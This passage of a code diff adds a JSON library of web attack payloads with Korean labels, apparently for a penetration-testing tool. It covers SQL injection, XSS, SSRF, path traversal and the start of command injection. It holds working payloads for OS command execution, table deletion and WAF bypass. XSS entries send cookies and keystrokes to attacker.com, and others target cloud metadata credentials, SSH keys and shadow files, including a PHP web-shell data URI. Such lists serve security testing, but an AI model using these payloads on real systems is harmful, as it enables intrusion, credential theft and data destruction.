+          "description": "Oracle 5초 지연",
+          "risk": "medium"
+        },
+        {
+          "id": "sqli_20",
+          "name": "파일 읽기 MySQL",
+          "payload": "' UNION SELECT LOAD_FILE('/etc/passwd'),null--",
+          "description": "MySQL 파일 읽기",
+          "risk": "critical"
+        },
+        {
+          "id": "sqli_21",
+          "name": "xp_cmdshell MSSQL",
+          "payload": "'; EXEC xp_cmdshell('whoami')--",
+          "description": "MSSQL OS 명령 실행",
+          "risk": "critical"
+        },
+        {
+          "id": "sqli_22",
+          "name": "대소문자 우회",
+          "payload": "' oR '1'='1",
+          "description": "대소문자 필터 우회",
+          "risk": "high"
+        },
+        {
+          "id": "sqli_23",
+          "name": "주석 공백 우회",
+          "payload": "'/**/OR/**/1=1--",
+          "description": "주석으로 공백 필터 우회",
+          "risk": "high"
+        },
+        {
+          "id": "sqli_24",
+          "name": "URL 인코딩 우회",
+          "payload": "%27%20OR%20%271%27%3D%271",
+          "description": "URL 인코딩 WAF 우회",
+          "risk": "high"
+        },
+        {
+          "id": "sqli_25",
+          "name": "이중 URL 인코딩",
+          "payload": "%2527%2520OR%25201%253D1",
+          "description": "이중 인코딩 우회",
+          "risk": "high"
+        },
+        {
+          "id": "sqli_26",
+          "name": "16진수 인코딩",
+          "payload": "' OR 0x313d31--",
+          "description": "16진수 인코딩 우회",
+          "risk": "high"
+        },
+        {
+          "id": "sqli_27",
+          "name": "탭 공백 우회",
+          "payload": "'\tOR\t1=1--",
+          "description": "탭 문자 공백 우회",
+          "risk": "high"
+        },
+        {
+          "id": "sqli_28",
+          "name": "DROP TABLE",
+          "payload": "'; DROP TABLE users--",
+          "description": "테이블 삭제 시도",
+          "risk": "critical"
+        },
+        {
+          "id": "sqli_29",
+          "name": "Stacked Query",
+          "payload": "'; INSERT INTO users VALUES('hacker','hacked')--",
+          "description": "다중 쿼리 삽입",
+          "risk": "critical"
+        },
+        {
+          "id": "sqli_30",
+          "name": "Boolean Blind (substr)",
+          "payload": "' AND SUBSTRING(username,1,1)='a'--",
+          "description": "문자 단위 데이터 추출",
+          "risk": "high"
+        },
+        {
+          "id": "sqli_31",
+          "name": "시간지연 Blind (MySQL, AND)",
+          "payload": "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -",
+          "description": "서브쿼리 기반 time-based blind",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"
+        },
+        {
+          "id": "sqli_32",
+          "name": "Boolean Blind 길이확인",
+          "payload": "1' AND LENGTH(database())>1-- -",
+          "description": "DB명 길이 이진 탐색",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/sql-injection/blind"
+        },
+        {
+          "id": "sqli_33",
+          "name": "Error-based updatexml",
+          "payload": "1' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -",
+          "description": "MySQL updatexml 에러 추출",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"
+        },
+        {
+          "id": "sqli_34",
+          "name": "Error-based floor/rand",
+          "payload": "1' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT version()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+          "description": "double-query 에러 추출",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"
+        },
+        {
+          "id": "sqli_35",
+          "name": "WAF 우회 - 공백을 주석으로",
+          "payload": "1'/**/OR/**/1=1-- -",
+          "description": "인라인 주석으로 공백 대체",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"
+        },
+        {
+          "id": "sqli_36",
+          "name": "WAF 우회 - 대소문자 혼합",
+          "payload": "1' UnIoN SeLeCt 1,2,3-- -",
+          "description": "키워드 대소문자 혼합",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/sql-injection"
+        },
+        {
+          "id": "sqli_37",
+          "name": "WAF 우회 - 중복 키워드",
+          "payload": "1' UNIONUNION SELECTSELECT 1,2-- -",
+          "description": "키워드 필터 중복 삽입 우회",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/sql-injection"
+        },
+        {
+          "id": "sqli_38",
+          "name": "PostgreSQL 스택 쿼리",
+          "payload": "1'; SELECT pg_sleep(5)-- -",
+          "description": "PostgreSQL time-based",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/PostgreSQL%20Injection.md"
+        },
+        {
+          "id": "sqli_39",
+          "name": "PostgreSQL 명령실행(COPY)",
+          "payload": "1'; COPY (SELECT '') TO PROGRAM 'id'-- -",
+          "description": "COPY TO PROGRAM RCE",
+          "risk": "critical",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection"
+        },
+        {
+          "id": "sqli_40",
+          "name": "MSSQL 스택 xp_cmdshell",
+          "payload": "1'; EXEC master..xp_cmdshell 'whoami'-- -",
+          "description": "MSSQL 명령 실행",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/MSSQL%20Injection.md"
+        },
+        {
+          "id": "sqli_41",
+          "name": "Oracle 시간지연",
+          "payload": "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
+          "description": "Oracle time-based",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/OracleSQL%20Injection.md"
+        },
+        {
+          "id": "sqli_42",
+          "name": "UNION 컬럼수 탐지(ORDER BY)",
+          "payload": "1' ORDER BY 5-- -",
+          "description": "컬럼 개수 탐지",
+          "risk": "medium",
+          "reference": "https://portswigger.net/web-security/sql-injection/union-attacks"
+        },
+        {
+          "id": "sqli_43",
+          "name": "UNION NULL 채우기",
+          "payload": "1' UNION SELECT NULL,NULL,NULL-- -",
+          "description": "컬럼 타입/개수 맞추기",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/sql-injection/union-attacks"
+        },
+        {
+          "id": "sqli_44",
+          "name": "DB 문자열 연결(MySQL)",
+          "payload": "1' UNION SELECT NULL,concat(user(),0x3a,database()),NULL-- -",
+          "description": "사용자/DB 추출",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/sql-injection"
+        },
+        {
+          "id": "sqli_45",
+          "name": "주석 변형(#)",
+          "payload": "admin'#",
+          "description": "해시 주석으로 나머지 무력화",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"
+        },
+        {
+          "id": "sqli_46",
+          "name": "Null byte 우회",
+          "payload": "1'%00 OR '1'='1",
+          "description": "널바이트로 필터 우회",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/sql-injection"
+        },
+        {
+          "id": "sqli_47",
+          "name": "과학적표기 우회",
+          "payload": "1' OR 1.0e1=1e1-- -",
+          "description": "숫자 비교 우회",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"
+        }
+      ]
+    },
+    {
+      "id": "xss",
+      "name": "XSS (Cross-Site Scripting)",
+      "icon": "📜",
+      "color": "#f39c12",
+      "payloads": [
+        {
+          "id": "xss_01",
+          "name": "기본 Script",
+          "payload": "<script>alert('XSS')</script>",
+          "description": "기본 스크립트 태그",
+          "risk": "high"
+        },
+        {
+          "id": "xss_02",
+          "name": "이미지 onerror",
+          "payload": "<img src=x onerror=alert('XSS')>",
+          "description": "이미지 onerror 이벤트",
+          "risk": "high"
+        },
+        {
+          "id": "xss_03",
+          "name": "SVG onload",
+          "payload": "<svg onload=alert('XSS')>",
+          "description": "SVG 태그 onload",
+          "risk": "high"
+        },
+        {
+          "id": "xss_04",
+          "name": "Body onload",
+          "payload": "<body onload=alert('XSS')>",
+          "description": "body 태그 onload",
+          "risk": "high"
+        },
+        {
+          "id": "xss_05",
+          "name": "Input autofocus",
+          "payload": "<input autofocus onfocus=alert('XSS')>",
+          "description": "input autofocus 이벤트",
+          "risk": "high"
+        },
+        {
+          "id": "xss_06",
+          "name": "Details ontoggle",
+          "payload": "<details open ontoggle=alert('XSS')>",
+          "description": "HTML5 details 태그",
+          "risk": "high"
+        },
+        {
+          "id": "xss_07",
+          "name": "Video onerror",
+          "payload": "<video src=x onerror=alert('XSS')>",
+          "description": "video 태그 오류 이벤트",
+          "risk": "high"
+        },
+        {
+          "id": "xss_08",
+          "name": "JavaScript URI",
+          "payload": "javascript:alert('XSS')",
+          "description": "javascript: 프로토콜",
+          "risk": "medium"
+        },
+        {
+          "id": "xss_09",
+          "name": "대소문자 혼합",
+          "payload": "<ScRiPt>alert('XSS')</ScRiPt>",
+          "description": "태그 대소문자 우회",
+          "risk": "high"
+        },
+        {
+          "id": "xss_10",
+          "name": "HTML 엔티티",
+          "payload": "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
+          "description": "HTML 엔티티 인코딩",
+          "risk": "high"
+        },
+        {
+          "id": "xss_11",
+          "name": "공백 없는 태그",
+          "payload": "<svg/onload=alert('XSS')>",
+          "description": "공백 없이 속성 연결",
+          "risk": "high"
+        },
+        {
+          "id": "xss_12",
+          "name": "속성 탈출 쌍따옴표",
+          "payload": "\" onmouseover=\"alert('XSS')",
+          "description": "속성값 쌍따옴표 탈출",
+          "risk": "medium"
+        },
+        {
+          "id": "xss_13",
+          "name": "속성 탈출 단따옴표",
+          "payload": "' onmouseover='alert(1)",
+          "description": "속성값 단따옴표 탈출",
+          "risk": "medium"
+        },
+        {
+          "id": "xss_14",
+          "name": "쿠키 탈취",
+          "payload": "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
+          "description": "쿠키 외부 전송",
+          "risk": "critical"
+        },
+        {
+          "id": "xss_15",
+          "name": "Template literal",
+          "payload": "<script>alert`XSS`</script>",
+          "description": "괄호 없는 alert 호출",
+          "risk": "high"
+        },
+        {
+          "id": "xss_16",
+          "name": "iframe srcdoc",
+          "payload": "<iframe srcdoc='<script>alert(1)</script>'>",
+          "description": "iframe srcdoc 속성",
+          "risk": "medium"
+        },
+        {
+          "id": "xss_17",
+          "name": "DOM 기반 Fragment",
+          "payload": "#<script>alert('XSS')</script>",
+          "description": "URL fragment DOM XSS",
+          "risk": "medium"
+        },
+        {
+          "id": "xss_18",
+          "name": "이중 URL 인코딩",
+          "payload": "%3Cscript%3Ealert('XSS')%3C/script%3E",
+          "description": "URL 이중 인코딩 우회",
+          "risk": "high"
+        },
+        {
+          "id": "xss_19",
+          "name": "SVG animate",
+          "payload": "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
+          "description": "SVG animate 이벤트",
+          "risk": "high"
+        },
+        {
+          "id": "xss_20",
+          "name": "키로거",
+          "payload": "<script>document.onkeypress=function(e){fetch('http://attacker.com/?k='+e.key)}</script>",
+          "description": "키 입력 탈취",
+          "risk": "critical"
+        },
+        {
+          "id": "xss_21",
+          "name": "Polyglot XSS",
+          "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/oNloAd=alert()//>>",
+          "description": "다중 컨텍스트 폴리글랏",
+          "risk": "high"
+        },
+        {
+          "id": "xss_22",
+          "name": "CSP 우회 JSONP",
+          "payload": "<script src=\"https://accounts.google.com/o/oauth2/revoke?callback=alert\"></script>",
+          "description": "JSONP CSP 우회",
+          "risk": "high"
+        },
+        {
+          "id": "xss_23",
+          "name": "이미지 onerror",
+          "payload": "<img src=x onerror=alert(document.domain)>",
+          "description": "가장 흔한 이벤트 핸들러 XSS",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+          "id": "xss_24",
+          "name": "SVG onload",
+          "payload": "<svg onload=alert(1)>",
+          "description": "SVG 로드 이벤트",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+          "id": "xss_25",
+          "name": "body onload",
+          "payload": "<body onload=alert(1)>",
+          "description": "body 이벤트 핸들러",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+          "id": "xss_26",
+          "name": "iframe srcdoc",
+          "payload": "<iframe srcdoc=\"<script>alert(1)</script>\">",
+          "description": "srcdoc 내부 스크립트",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+          "id": "xss_27",
+          "name": "details ontoggle",
+          "payload": "<details open ontoggle=alert(1)>",
+          "description": "필터 우회용 태그",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+          "id": "xss_28",
+          "name": "속성 탈출",
+          "payload": "\"><script>alert(1)</script>",
+          "description": "속성값 컨텍스트 탈출",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection"
+        },
+        {
+          "id": "xss_29",
+          "name": "JS 문자열 탈출",
+          "payload": "';alert(1);//",
+          "description": "인라인 JS 문자열 탈출",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection"
+        },
+        {
+          "id": "xss_30",
+          "name": "이벤트+autofocus",
+          "payload": "<input autofocus onfocus=alert(1)>",
+          "description": "자동 포커스 트리거",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+          "id": "xss_31",
+          "name": "마우스오버",
+          "payload": "<a href=# onmouseover=alert(1)>x</a>",
+          "description": "사용자 상호작용 트리거",
+          "risk": "medium",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+          "id": "xss_32",
+          "name": "대문자 태그 우회",
+          "payload": "<ScRiPt>alert(1)</ScRiPt>",
+          "description": "태그 대소문자 필터 우회",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting"
+        },
+        {
+          "id": "xss_33",
+          "name": "javascript: 프로토콜",
+          "payload": "javascript:alert(1)",
+          "description": "href/src 프로토콜 XSS",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection"
+        },
+        {
+          "id": "xss_34",
+          "name": "data URI 스크립트",
+          "payload": "data:text/html,<script>alert(1)</script>",
+          "description": "data URI 렌더",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting"
+        },
+        {
+          "id": "xss_35",
+          "name": "HTML 엔티티 우회",
+          "payload": "&lt;img src=x onerror=alert(1)&gt;",
+          "description": "엔티티 디코딩 후 실행되는 컨텍스트",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection"
+        },
+        {
+          "id": "xss_36",
+          "name": "백틱 템플릿",
+          "payload": "<script>alert`1`</script>",
+          "description": "괄호 없는 호출",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting"
+        },
+        {
+          "id": "xss_37",
+          "name": "onerror 인코딩",
+          "payload": "<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">",
+          "description": "base64 eval 우회",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting"
+        },
+        {
+          "id": "xss_38",
+          "name": "폼 액션 XSS",
+          "payload": "<form action=javascript:alert(1)><input type=submit>",
+          "description": "폼 액션 프로토콜",
+          "risk": "medium",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+          "id": "xss_39",
+          "name": "marquee onstart",
+          "payload": "<marquee onstart=alert(1)>",
+          "description": "레거시 이벤트",
+          "risk": "medium",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+          "id": "xss_40",
+          "name": "DOM 기반 hash",
+          "payload": "#<img src=x onerror=alert(1)>",
+          "description": "location.hash sink 대상",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/dom-based"
+        },
+        {
+          "id": "xss_41",
+          "name": "AngularJS 템플릿",
+          "payload": "{{constructor.constructor('alert(1)')()}}",
+          "description": "클라이언트 템플릿 인젝션",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+          "id": "xss_42",
+          "name": "polyglot",
+          "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/onload=alert()//>",
+          "description": "다중 컨텍스트 polyglot",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection"
+        }
+      ]
+    },
+    {
+      "id": "ssrf",
+      "name": "SSRF",
+      "icon": "🔀",
+      "color": "#9b59b6",
+      "payloads": [
+        {
+          "id": "ssrf_01",
+          "name": "localhost 127.0.0.1",
+          "payload": "http://127.0.0.1/",
+          "description": "내부 서비스 접근",
+          "risk": "high"
+        },
+        {
+          "id": "ssrf_02",
+          "name": "localhost",
+          "payload": "http://localhost/",
+          "description": "localhost 접근",
+          "risk": "high"
+        },
+        {
+          "id": "ssrf_03",
+          "name": "내부망 192.168.x.x",
+          "payload": "http://192.168.1.1/",
+          "description": "내부 라우터 접근",
+          "risk": "critical"
+        },
+        {
+          "id": "ssrf_04",
+          "name": "내부망 10.x.x.x",
+          "payload": "http://10.0.0.1/",
+          "description": "사설 IP 범위",
+          "risk": "critical"
+        },
+        {
+          "id": "ssrf_05",
+          "name": "AWS 메타데이터",
+          "payload": "http://169.254.169.254/latest/meta-data/",
+          "description": "AWS IMDSv1 메타데이터",
+          "risk": "critical"
+        },
+        {
+          "id": "ssrf_06",
+          "name": "AWS IAM 자격증명",
+          "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "description": "AWS IAM 키 탈취",
+          "risk": "critical"
+        },
+        {
+          "id": "ssrf_07",
+          "name": "GCP 메타데이터",
+          "payload": "http://metadata.google.internal/computeMetadata/v1/",
+          "description": "GCP 메타데이터",
+          "risk": "critical"
+        },
+        {
+          "id": "ssrf_08",
+          "name": "Azure 메타데이터",
+          "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+          "description": "Azure IMDS 접근",
+          "risk": "critical"
+        },
+        {
+          "id": "ssrf_09",
+          "name": "파일 프로토콜 Linux",
+          "payload": "file:///etc/passwd",
+          "description": "로컬 파일 읽기",
+          "risk": "critical"
+        },
+        {
+          "id": "ssrf_10",
+          "name": "파일 프로토콜 Windows",
+          "payload": "file:///C:/Windows/win.ini",
+          "description": "Windows 파일 읽기",
+          "risk": "critical"
+        },
+        {
+          "id": "ssrf_11",
+          "name": "Dict Redis",
+          "payload": "dict://127.0.0.1:6379/info",
+          "description": "Redis 정보 조회",
+          "risk": "high"
+        },
+        {
+          "id": "ssrf_12",
+          "name": "IPv6 localhost",
+          "payload": "http://[::1]/",
+          "description": "IPv6 루프백",
+          "risk": "high"
+        },
+        {
+          "id": "ssrf_13",
+          "name": "10진수 IP",
+          "payload": "http://2130706433/",
+          "description": "127.0.0.1 10진수",
+          "risk": "high"
+        },
+        {
+          "id": "ssrf_14",
+          "name": "8진수 IP",
+          "payload": "http://0177.0.0.1/",
+          "description": "127.0.0.1 8진수",
+          "risk": "high"
+        },
+        {
+          "id": "ssrf_15",
+          "name": "16진수 IP",
+          "payload": "http://0x7f000001/",
+          "description": "127.0.0.1 16진수",
+          "risk": "high"
+        },
+        {
+          "id": "ssrf_16",
+          "name": "@ 기호 우회",
+          "payload": "http://attacker.com@127.0.0.1/",
+          "description": "@로 호스트 우회",
+          "risk": "high"
+        },
+        {
+          "id": "ssrf_17",
+          "name": "Kubernetes API",
+          "payload": "http://10.96.0.1/api/v1/namespaces/default/secrets",
+          "description": "K8s API 서버",
+          "risk": "critical"
+        },
+        {
+          "id": "ssrf_18",
+          "name": "Elasticsearch",
+          "payload": "http://127.0.0.1:9200/_cat/indices",
+          "description": "ES 인덱스 조회",
+          "risk": "high"
+        },
+        {
+          "id": "ssrf_19",
+          "name": "내부 포트 8080",
+          "payload": "http://127.0.0.1:8080/",
+          "description": "내부 8080 포트 탐색",
+          "risk": "medium"
+        },
+        {
+          "id": "ssrf_20",
+          "name": "내부 포트 3306",
+          "payload": "http://127.0.0.1:3306/",
+          "description": "MySQL 포트 탐색",
+          "risk": "medium"
+        },
+        {
+          "id": "ssrf_21",
+          "name": "AWS IMDSv2 토큰",
+          "payload": "http://169.254.169.254/latest/api/token",
+          "description": "IMDSv2 토큰 요청",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf"
+        },
+        {
+          "id": "ssrf_22",
+          "name": "Alibaba 메타데이터",
+          "payload": "http://100.100.100.200/latest/meta-data/",
+          "description": "Alibaba Cloud 메타데이터",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf"
+        },
+        {
+          "id": "ssrf_23",
+          "name": "localhost 우회 - 0",
+          "payload": "http://0/",
+          "description": "축약 IP",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery"
+        },
+        {
+          "id": "ssrf_24",
+          "name": "DNS 리바인딩 도메인",
+          "payload": "http://localtest.me/",
+          "description": "공개 리바인딩용 도메인",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery"
+        },
+        {
+          "id": "ssrf_25",
+          "name": "@ 우회",
+          "payload": "http://expected-host@169.254.169.254/",
+          "description": "인증정보 구문으로 호스트 혼동",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery"
+        },
+        {
+          "id": "ssrf_26",
+          "name": "# 우회",
+          "payload": "http://169.254.169.254#@expected-host/",
+          "description": "fragment 혼동",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery"
+        },
+        {
+          "id": "ssrf_27",
+          "name": "gopher 프로토콜",
+          "payload": "gopher://127.0.0.1:6379/_INFO",
+          "description": "gopher로 Redis 등 공격",
+          "risk": "critical",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery"
+        }
+      ]
+    },
+    {
+      "id": "lfi",
+      "name": "LFI / Path Traversal",
+      "icon": "📁",
+      "color": "#27ae60",
+      "payloads": [
+        {
+          "id": "lfi_01",
+          "name": "Linux passwd",
+          "payload": "../../../etc/passwd",
+          "description": "Linux 계정 파일",
+          "risk": "high"
+        },
+        {
+          "id": "lfi_02",
+          "name": "Linux shadow",
+          "payload": "../../../etc/shadow",
+          "description": "패스워드 해시",
+          "risk": "critical"
+        },
+        {
+          "id": "lfi_03",
+          "name": "SSH 개인키",
+          "payload": "../../../root/.ssh/id_rsa",
+          "description": "root SSH 개인키",
+          "risk": "critical"
+        },
+        {
+          "id": "lfi_04",
+          "name": "AWS 자격증명",
+          "payload": "../../../root/.aws/credentials",
+          "description": "AWS 자격증명",
+          "risk": "critical"
+        },
+        {
+          "id": "lfi_05",
+          "name": "Apache 설정",
+          "payload": "../../../etc/apache2/apache2.conf",
+          "description": "Apache 설정 파일",
+          "risk": "medium"
+        },
+        {
+          "id": "lfi_06",
+          "name": "Nginx 설정",
+          "payload": "../../../etc/nginx/nginx.conf",
+          "description": "Nginx 설정 파일",
+          "risk": "medium"
+        },
+        {
+          "id": "lfi_07",
+          "name": "Windows hosts",
+          "payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+          "description": "Windows hosts",
+          "risk": "medium"
+        },
+        {
+          "id": "lfi_08",
+          "name": "Windows win.ini",
+          "payload": "..\\..\\..\\windows\\win.ini",
+          "description": "Windows 설정",
+          "risk": "medium"
+        },
+        {
+          "id": "lfi_09",
+          "name": "IIS web.config",
+          "payload": "..\\..\\..\\inetpub\\wwwroot\\web.config",
+          "description": "IIS 웹 설정",
+          "risk": "high"
+        },
+        {
+          "id": "lfi_10",
+          "name": "URL 인코딩",
+          "payload": "..%2F..%2F..%2Fetc%2Fpasswd",
+          "description": "URL 인코딩 우회",
+          "risk": "high"
+        },
+        {
+          "id": "lfi_11",
+          "name": "이중 URL 인코딩",
+          "payload": "..%252F..%252F..%252Fetc%252Fpasswd",
+          "description": "이중 인코딩 우회",
+          "risk": "high"
+        },
+        {
+          "id": "lfi_12",
+          "name": "Null 바이트",
+          "payload": "../../../etc/passwd%00",
+          "description": "Null 바이트 확장자 우회",
+          "risk": "medium"
+        },
+        {
+          "id": "lfi_13",
+          "name": "중복 슬래시",
+          "payload": "....//....//....//etc/passwd",
+          "description": "이중 슬래시 우회",
+          "risk": "high"
+        },
+        {
+          "id": "lfi_14",
+          "name": "PHP Filter Base64",
+          "payload": "php://filter/convert.base64-encode/resource=index.php",
+          "description": "PHP 소스 Base64",
+          "risk": "critical"
+        },
+        {
+          "id": "lfi_15",
+          "name": "PHP Input",
+          "payload": "php://input",
+          "description": "PHP POST 입력 스트림",
+          "risk": "high"
+        },
+        {
+          "id": "lfi_16",
+          "name": "Log Poisoning",
+          "payload": "../../../var/log/apache2/access.log",
+          "description": "Apache 로그 LFI-RCE",
+          "risk": "critical"
+        },
+        {
+          "id": "lfi_17",
+          "name": "Proc environ",
+          "payload": "../../../proc/self/environ",
+          "description": "환경 변수 파일",
+          "risk": "high"
+        },
+        {
+          "id": "lfi_18",
+          "name": "절대 경로",
+          "payload": "/etc/passwd",
+          "description": "절대 경로 직접 접근",
+          "risk": "high"
+        },
+        {
+          "id": "lfi_19",
+          "name": "깊은 traversal",
+          "payload": "../../../../../../../../etc/passwd",
+          "description": "충분히 깊은 상위 이동",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"
+        },
+        {
+          "id": "lfi_20",
+          "name": "Windows hosts",
+          "payload": "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+          "description": "윈도우 경로",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"
+        },
+        {
+          "id": "lfi_21",
+          "name": "Null byte 종료",
+          "payload": "../../../../etc/passwd%00",
+          "description": "확장자 강제 무력화(구버전 PHP)",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/file-inclusion"
+        },
+        {
+          "id": "lfi_22",
+          "name": "URL 인코딩 traversal",
+          "payload": "..%2f..%2f..%2f..%2fetc%2fpasswd",
+          "description": "슬래시 인코딩",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/file-inclusion"
+        },
+        {
+          "id": "lfi_23",
+          "name": "오버롱 UTF-8",
+          "payload": "..%c0%af..%c0%afetc/passwd",
+          "description": "비정상 UTF-8 슬래시",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/file-inclusion"
+        },
+        {
+          "id": "lfi_24",
+          "name": "PHP data 래퍼 RCE",
+          "payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==",
+          "description": "data 래퍼 코드 실행",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"
+        },
+        {
+          "id": "lfi_25",
+          "name": "PHP expect RCE",
+          "payload": "expect://id",
+          "description": "expect 래퍼 명령실행",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"
+        },
+        {
+          "id": "lfi_26",
+          "name": "proc self environ",
+          "payload": "/proc/self/environ",
+          "description": "환경변수/RCE 경유",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/file-inclusion"
+        },
+        {
+          "id": "lfi_27",
+          "name": "proc self cmdline",
+          "payload": "/proc/self/cmdline",
+          "description": "프로세스 인자 노출",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/file-inclusion"
+        },
+        {
+          "id": "lfi_28",
+          "name": "로그 포이즈닝 대상",
+          "payload": "/var/log/apache2/access.log",
+          "description": "로그 인젝션 후 포함",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/file-inclusion"
+        },
+        {
+          "id": "lfi_29",
+          "name": "경로 절단(dot)",
+          "payload": "../../../etc/passwd/./././",
+          "description": "경로 정규화 우회",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/file-inclusion"
+        },
+        {
+          "id": "lfi_30",
+          "name": "wrapper zip",
+          "payload": "zip://shell.jpg%23payload.php",
+          "description": "zip 래퍼 포함",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"
+        }
+      ]
+    },
+    {
+      "id": "cmdi",
+      "name": "Command Injection",
+      "icon": "💻",
+      "color": "#e67e22",
+      "payloads": [
+        {
+          "id": "cmdi_01",
+          "name": "세미콜론 분리",
+          "payload": "; id",
+          "description": "명령어 분리 실행",
+          "risk": "critical"
+        },
+        {
+          "id": "cmdi_02",
+          "name": "파이프 연결",
+          "payload": "| whoami",
+          "description": "파이프 명령 실행",
+          "risk": "critical"
+        },
+        {
+          "id": "cmdi_03",
+          "name": "AND 연산",
